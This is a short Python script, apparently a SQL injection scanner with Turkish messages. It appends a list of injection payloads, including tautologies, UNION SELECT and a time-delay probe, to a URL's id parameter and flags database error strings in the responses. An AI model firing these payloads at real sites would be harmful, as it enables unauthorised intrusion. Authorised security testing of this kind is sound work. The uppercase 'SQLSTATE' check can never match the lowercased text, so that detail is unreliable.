import requests

SQLI_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", "' UNION SELECT NULL--",
    "' AND 1=0 --", "' OR 'a'='a", "'; WAITFOR DELAY '0:0:5'--",
    "' AND ASCII(SUBSTRING(@@version,1,1)) > 50--"
]
ERROR_INDICATORS = ["sql syntax", "mysql_fetch", "native client", "SQLSTATE", "unexpected token"]

def test_sql_injection(url):
    vulnerabilities = []
    for payload in SQLI_PAYLOADS:
        test_url = f"{url}?id={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if any(error in r.text.lower() for error in ERROR_INDICATORS):
                vulnerabilities.append(f"⚠️ SQL Injection açığı tespit edildi: {test_url}")
        except requests.RequestException:
            continue
    return vulnerabilities
